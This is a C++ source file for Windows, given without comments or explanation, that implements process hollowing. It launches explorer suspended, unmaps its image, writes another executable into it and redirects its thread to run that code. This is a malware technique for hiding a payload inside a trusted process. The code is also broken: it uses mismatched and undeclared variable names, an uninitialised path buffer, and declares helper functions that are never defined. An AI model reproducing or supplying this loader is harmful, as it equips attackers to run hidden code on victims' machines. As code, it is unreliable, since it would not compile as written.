

#include "stdafx.h"
#include <Windows.h>
#include <vector>
#include <map>
#include <Ntsecapi.h>
#include <DbgHelp.h>

#define BUFFER_SIZE 0x2000

typedef struct PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	DWORD PebBaseAddress;
	PVOID Reserved2[2];
	DWORD UniqueProcessId;
	PVOID Reserved3;
};

typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);

typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	DWORD ProcessInformationLength,
	PDWORD ReturnLength
	);

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
	DWORD SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);


typedef struct _RTL_DRIVE_LETTER_CURDIR {
	USHORT                  Flags;
	USHORT                  Length;
	ULONG                   TimeStamp;
	UNICODE_STRING          DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _LDR_MODULE {
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	PVOID                   BaseAddress;
	PVOID                   EntryPoint;
	ULONG                   SizeOfImage;
	UNICODE_STRING          FullDllName;
	UNICODE_STRING          BaseDllName;
	ULONG                   Flags;
	SHORT                   LoadCount;
	SHORT                   TlsIndex;
	LIST_ENTRY              HashTableEntry;
	ULONG                   TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;

typedef struct _PEB_LDR_DATA {
	ULONG                   Length;
	BOOLEAN                 Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	ULONG                   MaximumLength;
	ULONG                   Length;
	ULONG                   Flags;
	ULONG                   DebugFlags;
	PVOID                   ConsoleHandle;
	ULONG                   ConsoleFlags;
	HANDLE                  StdInputHandle;
	HANDLE                  StdOutputHandle;
	HANDLE                  StdErrorHandle;
	UNICODE_STRING          CurrentDirectoryPath;
	HANDLE                  CurrentDirectoryHandle;
	UNICODE_STRING          DllPath;
	UNICODE_STRING          ImagePathName;
	UNICODE_STRING          CommandLine;
	PVOID                   Environment;
	ULONG                   StartingPositionLeft;
	ULONG                   StartingPositionTop;
	ULONG                   Width;
	ULONG                   Height;
	ULONG                   CharWidth;
	ULONG                   CharHeight;
	ULONG                   ConsoleTextAttributes;
	ULONG                   WindowFlags;
	ULONG                   ShowWindowFlags;
	UNICODE_STRING          WindowTitle;
	UNICODE_STRING          DesktopName;
	UNICODE_STRING          ShellInfo;
	UNICODE_STRING          RuntimeData;
	RTL_DRIVE_LETTER_CURDIR DLCurrentDirectory[0x20];
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_FREE_BLOCK {
	_PEB_FREE_BLOCK          *Next;
	ULONG                   Size;
} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;

typedef void(*PPEBLOCKROUTINE)(
	PVOID PebLock
);

typedef struct _PEB {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBaseAddress;
	PPEB_LDR_DATA           LoaderData;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PPEBLOCKROUTINE         FastPebLockRoutine;
	PPEBLOCKROUTINE         FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID*                  KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PPEB_FREE_BLOCK         FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID*                  ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID*                  *ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB, *PPEB;

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

#define CountRelocationEntries(dwBlockSize)		\
	(dwBlockSize -								\
	sizeof(BASE_RELOCATION_BLOCK)) /			\
	sizeof(BASE_RELOCATION_ENTRY)

inline PEB* GetPEB(
	)
{
	__asm {
		mov eax, dword ptr fs : 0x30; 
	}
}

inline PIMAGE_NT_HEADERS32 GetNTHeaders(
	DWORD dwImageBase)
{
	return (PIMAGE_NT_HEADERS32)(dwImageBase +
		((PIMAGE_DOS_HEADER)dwImageBase)->e_lfanew);
}

inline PLOADED_IMAGE GetLoadedImage(
	_In_ DWORD dwImageBase)
{
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;
	PIMAGE_NT_HEADERS32 pNTHeaders = GetNTHeaders(dwImageBase);

	PLOADED_IMAGE pImage = new LOADED_IMAGE();

	pImage->FileHeader =
		(PIMAGE_NT_HEADERS32)(dwImageBase + pDosHeader->e_lfanew);

	pImage->NumberOfSections =
		pImage->FileHeader->FileHeader.NumberOfSections;

	pImage->Sections =
		(PIMAGE_SECTION_HEADER)(dwImageBase + pDosHeader->e_lfanew +
			sizeof(IMAGE_NT_HEADERS32));

	return pImage;
}

inline char* GetDLLName(
	DWORD dwImageBase,
	IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor)
{
	return (char*)
		(dwImageBase + ImageImportDescriptor.Name);
}

inline IMAGE_DATA_DIRECTORY GetImportDirectory(
	PIMAGE_NT_HEADERS32 pFileHeader)
{
	return pFileHeader->
		OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
}

inline PIMAGE_IMPORT_DESCRIPTOR GetImportDescriptors(
	PIMAGE_NT_HEADERS32 pFileHeader,
	IMAGE_DATA_DIRECTORY ImportDirectory)
{
	return (PIMAGE_IMPORT_DESCRIPTOR)(
		pFileHeader->OptionalHeader.ImageBase +
		ImportDirectory.VirtualAddress);
}

inline PIMAGE_THUNK_DATA32 GetILT(DWORD dwImageBase,
	IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor)
{
	return (PIMAGE_THUNK_DATA32)(
		dwImageBase + ImageImportDescriptor.OriginalFirstThunk);
}

inline PIMAGE_THUNK_DATA32 GetIAT(DWORD dwImageBase,
	IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor)
{
	return (PIMAGE_THUNK_DATA32)(
		dwImageBase + ImageImportDescriptor.FirstThunk
		);
}

inline PIMAGE_IMPORT_BY_NAME GetImportByName(DWORD dwImageBase,
	IMAGE_THUNK_DATA32 itdImportLookup)
{
	return (PIMAGE_IMPORT_BY_NAME)(
		dwImageBase + itdImportLookup.u1.AddressOfData
		);
}


extern std::map<PWSTR, std::vector<DWORD>> g_CodeChecksums;

void WalkLoadOrderModules(
	void(*pLdrModuleFunction)(
		_In_ PLDR_MODULE,
		_In_ DWORD,
		_In_ PVOID), 
		_In_ PVOID pParameters);

void GenerateCodeChecksums(
	_In_ PLDR_MODULE pLdrModule,
	_In_ std::vector<DWORD>* pChecksums);

void SetInitialLdrCodeChecksums(
	_In_ PLDR_MODULE pLdrModule,
	_In_ DWORD dwIndex,
	_In_ PVOID pParams);

void ValidateLdrCodeChecksums(
	_In_ PLDR_MODULE pLdrModule,
	_In_ DWORD dwIndex,
	_In_ PVOID pParams);

typedef struct _IAT_BACKUP_INFO {
	DWORD BackupLength;
	DWORD*** IATBackup;
} IAT_BACKUP_INFO, *PIAT_BACKUP_INFO;

DWORD** BackupIAT(
	_In_ DWORD dwImageBase);

void RepairIAT(
	_In_ DWORD dwImageBase, 
	_In_ DWORD** pIATBackup);

DWORD FindRemotePEB(
	_In_ HANDLE hProcess);

PEB* ReadRemotePEB(
	_In_ HANDLE hProcess);

PLOADED_IMAGE ReadRemoteImage(
	_In_ HANDLE hProcess,
	_In_ LPCVOID lpImageBaseAddress);

DWORD 
FindRemotePEB(
	_In_ HANDLE hProcess
)
{
	HMODULE hNTDLL = LoadLibraryA("ntdll");

	if (!hNTDLL)
		return NULL;

	FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL,
		"NtQueryInformationProcess");

	if (!fpNtQueryInformationProcess)
		return NULL;

	_NtQueryInformationProcess NtQueryInformationProcess =
		(_NtQueryInformationProcess)fpNtQueryInformationProcess;

	PROCESS_BASIC_INFORMATION* pBasicInfo =
		new PROCESS_BASIC_INFORMATION();

	DWORD dwReturnLength = NULL;

	NtQueryInformationProcess(
		hProcess, NULL, pBasicInfo,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwReturnLength
	);
	return pBasicInfo->PebBaseAddress;
}

PEB* 
ReadRemotePEB(
	_In_ HANDLE hProcess
)
{
	DWORD dwPEBAddress = FindRemotePEB(hProcess);
	PEB* pPEB = new PEB();
	BOOL bSuccess = ReadProcessMemory(
		hProcess, (LPCVOID)dwPEBAddress,
		pPEB, sizeof(PEB), NULL
	);
	if (!bSuccess)
		return NULL;
	return pPEB;
}

PLOADED_IMAGE 
ReadRemoteImage(
	_In_ HANDLE hProcess,
	_In_ LPCVOID lpImageBaseAddress
)
{
	BYTE* lpBuffer = new BYTE[BUFFER_SIZE];
	BOOL bSuccess = ReadProcessMemory(
		hProcess, lpImageBaseAddress, lpBuffer,
		BUFFER_SIZE, NULL
	);

	if (!bSuccess)
		return NULL;

	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;
	PLOADED_IMAGE pImage = new LOADED_IMAGE();
	pImage->FileHeader =
		(PIMAGE_NT_HEADERS32)(lpBuffer + pDOSHeader->e_lfanew);
	pImage->NumberOfSections =
		pImage->FileHeader->FileHeader.NumberOfSections;
	pImage->Sections =
		(PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew +
			sizeof(IMAGE_NT_HEADERS32));
	return pImage;
}

VOID
RunPe(
	_In_ LPTSTR pDestProc,
	_In_ LPCTSTR pe
)
{

	LPSTARTUPINFOA hStartupInfo = new STARTUPINFO();
	LPPROCESS_INFORMATION hProcessInfo = new PROCESS_INFORMATION();

	CreateProcess(
		NULL, pDestProc, NULL, 
		NULL, NULL, CREATE_SUSPENDED, NULL,
		NULL, hStartupInfo, hProcessInfo
	);

	if (!pProcessInfo->hProcess){ return;}

	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
	PLOADED_IMAGE pImage = ReadRemoteImage(
		pProcessInfo->hProcess,
		pPEB->ImageBaseAddress
	);

	HANDLE hFile = CreateFile(
		pe, GENERIC_READ, NULL,
		NULL, OPEN_ALWAYS, NULL, NULL
	);

	if (hFile == INVALID_HANDLE_VALUE){ return; }

	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);
	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(
		hNTDLL, "NtUnmapViewOfSection");
	_NtUnmapViewOfSection NtUnmapViewOfSection =
		(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

	DWORD dwResult = NtUnmapViewOfSection(
		pProcessInfo->hProcess,
		pPEB->ImageBaseAddress
	);

	if (dwResult) { return; }

	PVOID pRemoteImage = VirtualAllocEx(
		pProcessInfo->hProcess, pPEB->ImageBaseAddress,
		pSourceHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT |
		MEM_RESERVE, PAGE_EXECUTE_READWRITE
	);

	if (!pRemoteImage)
	{
		return;
	}

	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -
		pSourceHeaders->OptionalHeader.ImageBase;

	pSourceHeaders->OptionalHeader.ImageBase = (
		DWORD)pPEB->ImageBaseAddress;
	if (!WriteProcessMemory(
			pProcessInfo->hProcess,
			pPEB->ImageBaseAddress,
			pBuffer,
			pSourceHeaders->OptionalHeader.SizeOfHeaders,
			NULL)
		)
	{
		return;
	}

	for (DWORD y = 0; y < pSourceImage->NumberOfSections; y++)
	{
		if (!pSourceImage->Sections[y].PointerToRawData)
			continue;

		PVOID pSectionDestination =
			(PVOID)((DWORD)pPEB->ImageBaseAddress
				+ pSourceImage->Sections[y].VirtualAddress);
		if (!WriteProcessMemory(
				pProcessInfo->hProcess,
				pSectionDestination,
				&pBuffer[pSourceImage->Sections[y].PointerToRawData],
				pSourceImage->Sections[y].SizeOfRawData,
				NULL)
			)
		{
			return;
		}
	}

	if (dwDelta)
		for (DWORD y = 0; y < pSourceImage->NumberOfSections; y++)
		{
			char* pSectionName = ".reloc";

			if (memcmp(pSourceImage->Sections[y].Name,
				pSectionName, strlen(pSectionName)))
				continue;
			DWORD dwRelocAddr = pSourceImage->
				Sections[y].PointerToRawData;
			DWORD dwOffset = NULL;

			IMAGE_DATA_DIRECTORY relocData =
				pSourceHeaders->
				OptionalHeader.DataDirectory[
					IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader =
					(PBASE_RELOCATION_BLOCK)&pBuffer[
						dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(
					pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks =
					(PBASE_RELOCATION_ENTRY)&pBuffer[
						dwRelocAddr + dwOffset];

				for (DWORD t = 0; t < dwEntryCount; t++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[t].Type == 0)
						continue;

					DWORD dwFieldAddress =
						pBlockheader->PageAddress + pBlocks[t].Offset;

					DWORD dwBuffer = 0;
					ReadProcessMemory(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)pPEB->ImageBaseAddress +
							dwFieldAddress), &dwBuffer,
						sizeof(DWORD), NULL
					);

					dwBuffer += dwDelta;

					BOOL bSuccess = WriteProcessMemory(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)pPEB->ImageBaseAddress +
							dwFieldAddress), &dwBuffer,
						sizeof(DWORD), NULL
					);

					if (!bSuccess){ continue; }
				}
			}

			break;
		}

	DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
		pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;

	if (!GetThreadContext(pProcessInfo->hThread, pContext))
	{
		return;
	}

	pContext->Eax = dwEntrypoint;

	if (!SetThreadContext(pProcessInfo->hThread, pContext))
	{
		return;
	}
	if (!ResumeThread(pProcessInfo->hThread))
	{
		return;
	}
}

VOID 
main(
)
{
	TCHAR pe[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, pPath);
	lstrcat(pe, L"\\pe.exe");
	RunPe("explorer",pe);

}



